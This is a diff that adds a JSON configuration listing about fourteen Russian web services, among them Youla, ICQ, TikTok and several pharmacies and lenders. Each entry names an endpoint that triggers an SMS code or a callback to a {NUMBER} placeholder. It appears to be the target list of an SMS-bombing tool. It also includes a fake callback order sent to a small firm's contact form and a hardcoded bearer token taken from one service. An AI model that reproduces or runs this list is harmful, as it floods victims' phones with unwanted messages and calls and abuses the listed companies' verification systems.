@@ -1,0 +1,223 @@
+[
+    {
+        "name": "youla",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://youla.ru/web-api/auth/request_code",
+        "data": {
+            "phone": "{NUMBER}"
+        }
+    },
+    {
+        "name": "yandex.eda",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://eda.yandex/api/v1/user/request_authentication_code",
+        "data": {
+            "phone_number": "{NUMBER}"
+        }
+    },
+    {
+        "name": "Cement",
+        "method": "POST",
+        "mask": "+###########",
+        "request_body": "FORM",
+        "URL": "https://xn----itbabpucg1bcg7b.xn--p1ai/wp-content/themes/dt-the7/php/contact.php",
+        "data": {
+            "contact_name": "Алекс",
+            "contact_phone": "{NUMBER}",
+            "contact_subject": "Заказ звонка"
+        }
+    },
+    {
+        "name": "creditter",
+        "method": "POST",
+        "mask": "+# (###) ###-##-##",
+        "request_body": "JSON",
+        "URL": "https://api.creditter.ru/confirm/sms/send",
+        "data": {
+            "phone": "{NUMBER}",
+            "type": "register"
+        },
+        "headers": {
+            "accept":"*/*",
+            "content-length":"48",
+            "Host":"creditter.ru",
+            "origin": "https://creditter.ru",
+            "referer": "https://creditter.ru"
+        }
+    },
+    {
+        "name": "eapteka",
+        "method": "POST",
+        "mask": "+# (###) ###-##-##",
+        "request_body": "JSON",
+        "URL": "https://www.eapteka.ru/api/v3/user",
+        "data": {
+            "phone": "{NUMBER}",
+            "force_sms": "true"
+
+        }
+    },
+    {
+        "name": "ntvplus",
+        "method": "GET",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://ntvplus.tv/auth-actions/request-code",
+        "data": {
+            "phone": "{NUMBER}"
+        },
+        "headers": {
+            "accept":"*/*",
+            "Connection":"keep-alive",
+            "Host":"ntvplus.tv"
+        }
+    },
+    {
+        "name": "sunlight",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://api.sunlight.net/v3/customers/authorization/",
+        "data": {
+            "phone": "{NUMBER}"
+
+        }
+    },
+    {
+        "name": "zoloto585",
+        "method": "POST",
+        "mask": "+# (###) ###-##-##",
+        "request_body": "JSON",
+        "URL": "https://zoloto585.ru/api/bcard/reg/",
+        "data": {
+            "name": "",
+            "surname": "",
+            "paronymic": "",
+            "sex": "m",
+            "birthdate": "..",
+            "phone": "{NUMBER}",
+            "email": "",
+            "city": ""
+        }
+    },
+    {
+        "name": "mailwork",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://api.iconjob.co/api/auth/verification_code",
+        "data": {
+            "phone": "{NUMBER}"
+
+        }
+    },
+    {
+        "name": "wifi",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://cabinet.wi-fi.ru/api/auth/by-sms",
+        "data": {
+            "msisdn": "{NUMBER}"
+
+        }
+    },
+    {
+        "name": "tik-tok",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://m.tiktok.com/node-a/send/download_link",
+        "10digits": true,
+        "data": {
+            "slideVerify":0,
+            "language":"ru",
+            "PhoneRegionCode":"7",
+            "Mobile":"{NUMBER}",
+            "page":{
+                "pageName":"home",
+                "launchMode":"direct",
+                "trafficType":""
+                }
+            }
+    },
+    {
+        "name": "koronapay",
+        "method": "POST",
+        "mask": "",
+        "request_body": "FORM",
+        "URL": "https://koronapay.com/transfers/online/api/users/otps",
+        "data": {
+            "phone": "{NUMBER}"
+
+        }
+    },
+    {
+        "name": "karusel",
+        "method": "POST",
+        "mask": "",
+        "request_body": "FORM",
+        "URL": "https://app.karusel.ru/api/v1/phone/",
+        "data": {
+            "phone": "{NUMBER}"
+
+        }
+    },
+    {
+        "name": "icq",
+        "method": "POST",
+        "mask": "",
+        "10digits": true,
+        "request_body": "JSON",
+        "URL": "https://u.icq.net/api/v51/rapi/auth/sendCode",
+        "headers": {
+            "accept":"*/*",
+            "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,th;q=0.6",
+            "origin": "https://web.icq.com",
+            "Host":"web.icq.com",
+            "referer": "https://web.icq.com/"
+        },
+        "data": {
+            "reqId":"44522-1618146227",
+            "params":{
+                "phone":"{NUMBER}",
+                "language":"ru-RU",
+                "route":"sms",
+                "devId":"ic1rtwz1s1Hj1O0r",
+                "application":"icq"
+                }
+            }
+    },
+    {
+        "name": "asna",
+        "method": "POST",
+        "mask": "",
+        "request_body": "JSON",
+        "URL": "https://www.asna.ru/api/v1/connect/authorize/",
+        "headers": {
+            "authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImp0aSI6IjRmMWcyM2ExMmFhIn0.eyJpc3MiOiJodHRwczpcL1wvd3d3LmFzbmEucnUiLCJhdWQiOiJodHRwczpcL1wvd3d3LmFzbmEucnUiLCJqdGkiOiI0ZjFnMjNhMTJhYSIsImlhdCI6MTYxODE0NzcwMywiZXhwIjoxNjE4MjM0MTAzLCJjbGllbnRJZCI6IjI2ZjI3NWVmLWQ5YWUtNDI2Yi05NjNiLWE4ZDYxNTBmYTVjYSIsInVzZXJJZCI6MCwiZGV2aWNlSWQiOm51bGwsImZVc2VySWQiOjE0MDg3NTAyMzksInB1c2hUb2tlbiI6bnVsbCwiYWxsb3dlZEVudGl0aWVzIjpbXSwiYmFubmVkRW50aXRpZXMiOlsiIl0sIm9zTmFtZSI6bnVsbCwiZGV2aWNlTWFudWZhY3R1cmVyIjpudWxsfQ.K2Pd_Og4awXxnQwqbch0aZjBkFTsAgX3Woo8IRfDY-w"
+        },
+        "data": {
+            "data":{
+                "attributes":{
+                    "code":null,
+                    "phone":"{NUMBER}"
+                    },
+                    "type":"user"
+                    }
+                }
+    }
+    
+]
+    
+    
+    
+    
+    
+    
+    
+    
